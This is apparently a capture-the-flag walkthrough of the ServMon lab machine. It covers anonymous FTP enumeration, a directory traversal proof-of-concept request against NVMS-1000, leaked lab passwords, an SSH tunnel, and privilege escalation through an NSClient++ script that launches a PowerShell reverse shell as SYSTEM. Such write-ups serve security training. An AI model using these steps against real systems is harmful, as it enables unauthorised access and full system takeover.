

## About

ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to LFI, which is used to read a list of passwords on a user&amp;#039;s desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it&amp;#039;s possible enumerate the system and find the password for `NSClient++` (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app. The app contains functionality to create scripts that can be executed in the context of `NT AUTHORITY\SYSTEM`. Users have been given permissions to restart the `NSCP` service, and after creating a malicious script, the service is restarted and command execution is achieved as SYSTEM.

## Nmap



```
nmap -v -sT -p- -T5 10.129.50.93
```

```
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

## Try to login into the ftp

### anonymous login enabled

```
ftp 10.129.50.93 
Connected to 10.129.50.93.
220 Microsoft FTP Service
Name (10.129.50.93:kali): anonymous
331 Anonymous access allowed
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49677|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49679|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> 
```
### found dir

![](pics/Pasted%20image%2020260826200004.png)
Found users directory
```
02-28-22  07:35PM       <DIR>          Users
```


Contains
![](pics/Pasted%20image%2020260826200023.png)
```
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
```

### Nadine

![](pics/Pasted%20image%2020260826200105.png)

```
02-28-22  07:36PM                  168 Confidential.txt
```


```
cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine  
```

![](pics/Pasted%20image%2020260826200447.png)

### Nathan


![](pics/Pasted%20image%2020260826200256.png)
```
02-28-22  07:36PM                  182 Notes to do.txt
```


![](pics/Pasted%20image%2020260826200530.png)

```
cat Notes.txt       
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint  
```


## Check port 80

## Page in the browser
![](pics/Pasted%20image%2020260826192343.png)

## looking for CVEs

We found a directory traversal
![](pics/Pasted%20image%2020260826193906.png)

affecting `NVMS 1000`.

```
POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

### Manual exploit

Since we know from the ftp file that Nadine left password file inside Nathan desktop we utilize the exploit for that.
![](pics/Pasted%20image%2020260826200752.png)

contents of `passwords.txt`:

```
1nsp3ctTh3Way2Mars!

Th3r34r3To0M4nyTrait0r5!

B3WithM30r4ga1n5tMe

L1k3B1gBut7s@W0rk

0nly7h3y0unGWi11F0l10w

IfH3s4b0Utg0t0H1sH0me

Gr4etN3w5w17hMySk1Pa5$
```

# Using passwords.txt
brute force `Nadine` user.
![](pics/Pasted%20image%2020260826201713.png)

```
login:    Nadine
password: L1k3B1gBut7s@W0rk

```


## flag 1 (using ssh login)

```
ssh Nadine@10.129.50.93
```

Found first flag.
![](pics/Pasted%20image%2020260826201923.png)


## privesc phase

After enumerating the programs on the machine found `NSClient++` storing a password inside a init file.

```
type nsclient.ini 
```

![](pics/Pasted%20image%2020260826203115.png)



### trying the password

```
password = ew2x6SsGTxjRwXOT
```

![](pics/Pasted%20image%2020260826204755.png)
That password did not after some research it turns out that this program only allow local access.

### SSH tunnel

So I needed a tunnel:
The `~C` shortcut did not work for me so I did this:
```
ssh -L 8443:127.0.0.1:8443 Nadine@10.129.227.77
```

### Access website
Using `127.0.0.1:8443/` I can login just like if I am a local user
![](pics/Pasted%20image%2020260826214632.png)


### getting root access
This program have a module that execute scripts with SYSTEM priv

Used a powershell reverse shell
![](pics/Pasted%20image%2020260826231245.png)

placed the powershell payload inside `Temp` directory I created then typed the powershell command to executed as the script. as shown:

![](pics/Pasted%20image%2020260826231133.png)


choose the new script created:
![](pics/Pasted%20image%2020260826231151.png)

Then ran the script manually without scheduled jobs via the `Run` button:
![](pics/Pasted%20image%2020260826231203.png)


Before you run the script make sure that your netcat is setup with the correct port
![](pics/Pasted%20image%2020260826232726.png)
Finally you should be left with a root shell !
## flag 2
![](pics/Pasted%20image%2020260826231340.png)


![](pics/Pasted%20image%2020260828212603.png)
